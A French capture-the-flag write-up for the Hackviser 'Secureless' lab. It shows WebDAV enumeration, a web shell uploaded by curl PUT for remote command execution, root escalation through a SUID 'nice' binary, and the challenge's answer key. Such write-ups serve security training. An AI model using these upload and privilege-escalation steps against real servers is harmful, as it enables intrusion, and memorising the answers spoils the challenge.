# Writeup : Secureless (Hackviser)

## Introduction

- **Plateforme** : Hackviser
- **Nom de la machine / Challenge** : Secureless
- **Difficulté** : Easy
- **Type** : Web, System
- **Objectif** : Enquêter sur le groupe "Melody Hacker Team", trouver des informations sur leurs activités illégales, élever les privilèges sur leur serveur et répondre à une série de questions.

---

## Étape 1 : Reconnaissance et Énumération

Nous commençons par cibler l'adresse IP de la machine (définie dans `/etc/hosts` comme `melodyhackerteam.hv`).
Une courte énumération des répertoires du serveur web avec l'outil `dirb` (ou `ffuf`) nous indique la présence de plusieurs chemins standards, mais surtout l'existence d'un dossier intéressant : `/webdav/`.

```bash
dirb http://melodyhackerteam.hv
```

**Découvertes notables :**

- `/js/`
- `/css/`
- `/image/`
- `/server-status` (403 Forbidden)
- `/webdav/` (403 Forbidden au premier abord via navigateur, mais la piste est lancée)

---

## Étape 2 : Exploitation de l'insecure WebDAV

Étant donné que le dossier s'appelle explicitement `webdav`, nous testons s'il ne s'agit pas du service éponyme mal sécurisé.
Nous utilisons `curl` pour vérifier les méthodes HTTP autorisées (requête `OPTIONS`) :

```bash
curl -X OPTIONS -v http://melodyhackerteam.hv/webdav/
```

**Résultat :** Le serveur autorise un large éventail de méthodes, dont `OPTIONS, GET, HEAD, POST, DELETE, TRACE, PROPFIND, PROPPATCH, COPY, MOVE, LOCK, UNLOCK`.

### Fouiller le contenu du dossier

Nous listons son contenu avec la méthode `PROPFIND` et le header `Depth: 1` pour éviter une boucle infinie :

```bash
curl -X PROPFIND -H "Depth: 1" -v http://melodyhackerteam.hv/webdav/
```

Le serveur répond avec une structure XML listant plusieurs fichiers, dont :

- `hello.txt`
- `melody_index.zip` (L'archive de leur fameuse page "hacked by")
- `web_shell_backup.zip` (Une archive backup très suspecte)

En téléchargeant et décompressant `web_shell_backup.zip`, nous identifions le nom commun du web shell qu'ils utilisent : **`shell.php`**.

### Upload et RCE (Remote Code Execution)

Le service autorise sans restriction la méthode `PUT` ou la méthode `COPY`/`MOVE`. Nous pouvons uploader directement le payload `shell.php` dans le répertoire pour l'exécuter.
Nous l'uploadons depuis notre machine locale :

```bash
curl -X PUT --data-binary @shell.php http://melodyhackerteam.hv/webdav/shell.php
```

Le shell est disponible sur `http://melodyhackerteam.hv/webdav/shell.php`. En effectuant des requêtes `POST` vers ce script avec l'argument `cmd`, nous pouvons exécuter des commandes en tant qu'utilisateur `www-data` :

```bash
curl -s -X POST -d "cmd=id" -d "cwd=." "http://melodyhackerteam.hv/webdav/shell.php?feature=shell"
```

---

## Étape 3 : Élévation de Privilèges (Privilege Escalation)

Maintenant sur le serveur, il nous faut fouiller pour trouver les cibles du groupe. L'utilisateur courant (`www-data`) ou même l'utilisateur standard `melody` (dont l'historique est vide) ne possèdent pas les droits sur les fichiers qui nous intéressent vraiment.

Nous cherchons des binaires mal configurés avec un bit SUID (permettant à n'importe quel utilisateur d'exécuter l'outil en tant que son propriétaire, ici `root`) :

```bash
find / -perm -4000 2>/dev/null
```

Parmi les exécutables classiques, un fichier sort du lot : **`/usr/bin/nice`**.

L'outil `nice` est sert à ajuster la priorité de lancement (scheduling priority) d'une autre commande. Avoir le bit SUID dessus signifie que l'on peut exécuter *n'importe quelle* commande via `nice`, et qu'elle s'exécutera sous les privilèges du super-utilisateur (root) !

```bash
# Exemple pour lister le répertoire de l'admin
nice ls -la /root

# Ou lire un fichier qui y est stocké
nice cat /root/...
```

---

## Étape 4 : Récupération du flag final

Grâce à notre payload `nice`, nous explorons le dossier `/root/` et trouvons un fichier captivant : **`telegram_chat_backup.txt`**.
Ce fichier est chiffré/encodé en Base64. Nous le lisons avec le compte root et le décodons à la volée sur notre machine :

```bash
nice cat /root/telegram_chat_backup.txt | base64 -d
```

Ce document est un log de conversation Telegram entre trois membres du groupe ("HackerShadow", "CyberWolf" et "DataKraken"). La retranscription dévoile tous les détails de leur attaque imminente.

---

## Réponses aux questions du challenge

1. **What is the name of the service found to be insecure?**
   - **Réponse :** `WebDAV` (Découvert à l'énumération HTTP)

2. **What is the path of the "hacked by" index page used by the hacker group in zip format on the server?**
   - **Réponse :** `/webdav/melody_index.zip` (Localisé grâce à la méthode PROPFIND)

3. **What is the common name of the web shell file used by the hacker group?**
   - **Réponse :** `shell.php` (Découvert dans l'archive volée de leur dashboard)

4. **What is the domain name of the first targeted website?**
   - **Réponse :** `galacticshop.hv` (Trouvé au début de la discussion dans le backup de chat)

5. **What is the IP address planned for DDoS attack?**
   - **Réponse :** `93.184.216.34` (Justifié par HackerShadow dans la conversation)

6. **What is the planned time of DDoS attack?**
   - **Réponse :** `3 PM UTC` (L'heure confirmée pour surcharger les serveurs à leur "peak time")

7. **What is the domain name of the second targeted website?**
   - **Réponse :** `innovatesphere.hv` (Évoqué par DataKraken en tant que cible de diversion ou secondaire)

---
**Pwned !** La machine MelodyHackerTeam est compromise, l'historique root récupéré et les plans du groupe sont neutralisés.
